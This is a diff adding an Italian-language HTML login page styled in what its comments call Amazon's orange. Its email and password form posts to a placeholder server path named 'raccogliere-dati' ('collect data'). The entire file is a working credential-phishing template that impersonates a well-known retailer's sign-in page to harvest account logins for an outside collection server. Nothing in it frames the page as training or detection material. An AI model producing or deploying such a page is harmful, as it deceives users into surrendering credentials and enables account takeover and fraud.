@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Accesso al tuo account</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            background-color: #f2f2f2; /* Colore di sfondo chiaro */
+        }
+        .container { 
+            max-width: 400px; 
+            margin: auto; 
+            padding: 20px; 
+            border: 1px solid #ccc; 
+            background-color: #fff; /* Colore di sfondo del contenitore */
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Leggera ombra per un effetto di profondità */
+        }
+        h1 { 
+            text-align: center; 
+            color: #ff9900; /* Colore giallo di Amazon */
+        }
+        label { 
+            display: block; 
+            margin: 10px 0 5px; 
+        }
+        input { 
+            width: calc(100% - 20px); 
+            padding: 10px; 
+            margin-bottom: 10px; 
+            box-sizing: border-box; 
+            border: 1px solid #ccc; 
+            border-radius: 4px; /* Angoli arrotondati */
+        }
+        button { 
+            width: 100%; 
+            padding: 10px; 
+            background-color: #ff9900; /* Colore giallo di Amazon */
+            border: none; 
+            color: white; 
+            font-size: 16px; 
+            cursor: pointer; 
+            border-radius: 4px; /* Angoli arrotondati */
+        }
+        button:hover { 
+            background-color: #e68a00; /* Colore giallo scuro al passaggio del mouse */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Accedi al tuo account</h1>
+        <form action="https://tuo-server.com/raccogliere-dati" method="POST">
+            <label for="email">Email:</label>
+            <input type="text" id="email" name="email" required>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+            <button type="submit">Accedi</button>
+        </form>
+    </div>
+</body>
+</html>
